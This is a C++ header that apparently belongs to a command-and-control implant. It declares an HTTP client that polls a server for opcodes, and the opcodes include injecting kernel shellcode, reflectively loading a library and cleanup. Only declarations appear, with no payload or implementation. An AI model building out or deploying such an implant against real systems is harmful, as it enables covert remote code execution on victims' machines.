#pragma once
#include "pch.h"
#include "httplib.h"

constexpr DWORD KeepAliveOpcode = 0;

enum class ServerOpcode {
	InjectKernelShellcode = 1,
	LoadLibraryReflectively,
	Cleanup
};

enum class ClientOpcode {
	Success = 1,
	Failure
};

class HttpClient
{
	using CallbackFunctionSignature = void(const ServerOpcode, const PVOID, const size_t, std::string*, const size_t);

private:
	std::function<void(const ServerOpcode, const PVOID, const size_t, std::string*, const size_t)> CallbackFunction;
	
	httplib::Client Client;

public:
	HttpClient(std::string IpAddress, DWORD Port, std::function<CallbackFunctionSignature> Callback = nullptr)
		: CallbackFunction(Callback), Client(IpAddress, Port) { }
	
	httplib::Error FetchFromServer();

	~HttpClient() { Client.stop(); }
};